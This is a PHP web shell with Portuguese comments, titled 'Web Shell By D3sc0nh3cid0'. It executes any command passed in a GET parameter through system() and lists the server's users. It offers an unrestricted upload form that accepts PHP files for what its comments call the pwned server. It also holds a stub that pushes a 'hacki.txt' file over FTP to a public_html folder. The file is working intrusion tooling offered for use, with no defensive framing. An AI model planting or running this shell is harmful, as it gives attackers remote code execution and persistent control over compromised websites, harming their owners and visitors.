<?php
    $cmd = $_GET["cmd"];
    $c = $_GET["comando"];
    $ip = $_SERVER["REMOTE_ADDR"];

    $msg_upload = "";
    $msg_server = "";

    if (isset($_POST["btn_upload"])) {
       
        // Pasta onde o arquivo vai ser salvo
        $_UP['pasta'] = 'ups/';
         
        // Tamanho máximo do arquivo (em Bytes)
        $_UP['tamanho'] = 1024 * 1024 * 2; // 2Mb
         
        // Array com as extensões permitidas
        $_UP['extensoes'] = array('jpg', 'png', 'gif', 'php', 'html', 'txt', 'apk', 'css', 'js', 'jpeg');
         
        // Renomeia o arquivo? (Se true, o arquivo será salvo como .jpg e um nome único)
        $_UP['renomeia'] = false;
         
        // Array com os tipos de erros de upload do PHP
        $_UP['erros'][0] = 'Não houve erro';
        $_UP['erros'][1] = 'O arquivo no upload é maior do que o limite do PHP';
        $_UP['erros'][2] = 'O arquivo ultrapassa o limite de tamanho especifiado no HTML';
        $_UP['erros'][3] = 'O upload do arquivo foi feito parcialmente';
        $_UP['erros'][4] = 'Não foi feito o upload do arquivo';
         
        // Verifica se houve algum erro com o upload. Se sim, exibe a mensagem do erro
        if ($_FILES['arquivo']['error'] != 0) {
            die("Não foi possível fazer o upload, erro:<br />" . $_UP['erros'][$_FILES['arquivo']['error']]);
            exit; // Para a execução do script
        }
         
        // Caso script chegue a esse ponto, não houve erro com o upload e o PHP pode continuar
  
        // O arquivo passou em todas as verificações, hora de tentar movê-lo para a pasta
        else {
            // Primeiro verifica se deve trocar o nome do arquivo
            if ($_UP['renomeia'] == true) {
                // Cria um nome baseado no UNIX TIMESTAMP atual e com extensão .jpg
                $nome_final = time().'.jpg';
            } 
            else {
                // Mantém o nome original do arquivo
                $nome_final = $_FILES['arquivo']['name'];
            }
             
            // Depois verifica se é possível mover o arquivo para a pasta escolhida
            if (move_uploaded_file($_FILES['arquivo']['tmp_name'], $_UP['pasta'] . $nome_final)) {
                // Upload efetuado com sucesso, exibe uma mensagem e um link para o arquivo
                $msg_upload = "<span style='color: green;'>Upload efetuado com sucesso!</span>";
            } 
            else {
                // Não foi possível fazer o upload, provavelmente a pasta está incorreta
                $msg_upload = "<span style='color: red;'>Não foi possível enviar o arquivo, tente novamente</span>";
            }
         
        }

      

    }

    if (isset($_POST["btn_serverr"])) {
        

        echo "APERTADO";
        //$host = $_POST["host"];
        //$usuario = $_POST["usuario"];
        //$senha = $_POST["senha"];
        //$arquivo = $_POST["arquivo"];
        //$diretorio = "/public_html/";

        $dados = array(
            "host" => "",
            "usuario" => "",
            "senha" => ""
        );

        $conexao = ftp_connect($dados["host"]);

        ftp_login($conexao, $dados["usuario"], $dados["senha"]);

        ftp_put($conexao, "/public_html", "/pasta/hacki.txt", FTP_BINARY);

        ftp_close($conexao);

        echo "\n\nConexão encerrada";
    }
?>

<!DOCTYPE html>
<html lang=pt-br>
    <title>Web Shell By D3sc0nh3cid0</title>
    <meta charset="utf-8">
    <style>
        body{
            background-color: black;
            color: white;
        }
        
        #comando{
            font-size: 16px;
            border-radius: 2px;
            height: 30px;
            border-color: #4dff00;
            color: white;
            background-color: black;
            width: 80%;
        }

        #campo_server{
            font-size: 16px;
            border-radius: 2px;
            height: 30px;
            border-color: #4dff00;
            color: white;
            background-color: black;
            width: 205px;
        }

        #btn_comando{
            width: 130px;
            border-radius: 3px;
            height: 30px;
            border-style: none;
            background-color: #4dff00;
            transition: 0.2s;
        }

        #btn_server{
            width: 135px;
            border-radius: 3px;
            height: 30px;
            border-style: none;
            background-color: #4dff00;
            transition: 0.2s;
        }

        #btn_upload{
            width: 135px;
            border-radius: 3px;
            height: 30px;
            border-style: none;
            background-color: #4dff00;
            transition: 0.2s;
        }

        #btn_upload:hover{
            background-color: black;
            color: white;
            cursor: pointer;   
        }

        #btn_server:hover{
            background-color: black;
            color: white;
            cursor: pointer;   
        }

        #btn_comando:hover{
            background-color: black;
            color: white;
            cursor: pointer;
        }

    </style>
    <body>

        <?php
            $users = "users";
            echo "IP: $ip | Usuários do server: "; system($users);
        ?>
  
        <!-- CAMPO DE INSERIR OS COMANDOS -->
        <form method="GET" action="cmd.php">
            <input type="txt" placeholder="Digite o comando" name="comando" autofocus id="comando" value="<?php echo $c; ?>">
            <input type="submit" value="Enviar comando" id="btn_comando">
        </form>

        <br>

        <!-- CAMPO DE INSERIR INFORMAÇÕES DO SERVER Á RECEBER O ARQUIVO -->
        <span style="color: gray;">Indisponível no momento...</span>
        <form method="POST">
            <input type="txt" placeholder="Nome arquivo [arquivo.php]" id="campo_server" name="arquivo">
            <input type="txt" placeholder="Usuário" id="campo_server" name="usuario">
            <input type="password" placeholder="Senha" id="campo_server" name="senha">
            <input type="txt" placeholder="Host [ftp.servidor.com]" id="campo_server" name="host">
            <input type="txt" placeholder="/public_html/arquivos/" id="campo_server" name="diretorio">
            <input type="submit" value="Enviar pro server" id="btn_server" name="btn_serverr">
        </form>
        <?php echo $msg_server; ?>

        <hr>

        <!-- CAMPO PARA UPAR UM ARQUIVO PARA O SERVER PWNADO -->
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="arquivo"><br>
            <input type="submit" value="Fazer Upload" id="btn_upload" name="btn_upload">
        </form>
        <?php echo $msg_upload; ?>

        <hr>

        <br>
        <span style="color: #0fff00;"><?php system($_GET["comando".$cmd]); ?></span>    
    </body>
</html>
